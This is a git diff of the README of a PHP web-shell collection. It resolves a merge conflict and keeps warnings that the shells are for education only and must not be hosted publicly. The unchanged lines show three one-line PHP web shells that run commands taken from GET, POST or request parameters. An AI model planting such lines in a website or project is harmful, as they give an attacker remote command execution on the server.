@@ -8,11 +8,10 @@ To contribute other shells not listed here... Fork, Push the changes to your rep
 php-webshells
 =============
 
-<<<<<<< HEAD
 Common PHP shells. Do not put these on a publicly-accessible webserver.
 
 These are provided for education purposes only.
-=======
+
 Common php webshells. Do not host the file(s) in your server!
 
 ++++++++++++++++++++++++++
@@ -32,6 +31,3 @@ WebHandler.py works for POST and GET requests:
     <?php system($_GET['cmd']); ?>
     <?php passthru($_REQUEST['cmd']); ?>
     <?php echo exec($_POST['cmd']); ?>
-
-
->>>>>>> e474a21202962d29bda156e5f384499d3b993645
